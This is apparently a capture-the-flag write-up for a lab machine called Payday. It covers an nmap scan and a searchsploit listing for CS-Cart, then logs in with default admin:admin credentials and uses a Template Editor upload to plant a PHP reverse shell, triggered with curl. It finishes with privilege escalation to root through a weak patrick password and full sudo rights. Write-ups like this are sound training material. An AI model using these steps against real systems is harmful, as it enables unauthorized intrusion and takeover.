# Payday

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.39 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 13:42 +08
Nmap scan report for 192.168.157.39
Host is up (0.18s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3
```

### CS-Cart -> RCE

Port 80 was running InternetShop CS-Cart, which looks really vulnerable:

<figure><img src="../../../.gitbook/assets/image (3733).png" alt=""><figcaption></figcaption></figure>

There are loads of exploits for this:

```
$ searchsploit cs-cart
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
CS-Cart - Multiple SQL Injections                          | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting           | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                          | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion        | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting         | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                          | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                      | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection          | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection     | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection               | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                 | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection             | php/webapps/40770.txt
----------------------------------------------------------- ---------------------------------
```

We can take a look at the authenticated RCE, since we can login using `admin:admin`.&#x20;

```
$ cat 48891.txt
get PHP shells from
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
edit IP && PORT
Upload to file manager
change the extension from .php to .phtml
visit http://[victim]/skins/shell.phtml -> Profit. ...! 
```

We can then access `admin.php` with the same credentials:

<figure><img src="../../../.gitbook/assets/image (3466).png" alt=""><figcaption></figcaption></figure>

Head to 'Template Editor' and upload the file that we want.&#x20;

<figure><img src="../../../.gitbook/assets/image (3463).png" alt=""><figcaption></figcaption></figure>

Then, just run this:

```bash
$ curl http://192.168.157.39/skins/rev.phtml
```

And we would get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (3141).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Weak Creds -> Root

We can `su` to the user `patrick` using the password `patrick`. This user can run `sudo` for everything:

```
patrick@payday:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL
```

<figure><img src="../../../.gitbook/assets/image (2854).png" alt=""><figcaption></figcaption></figure>
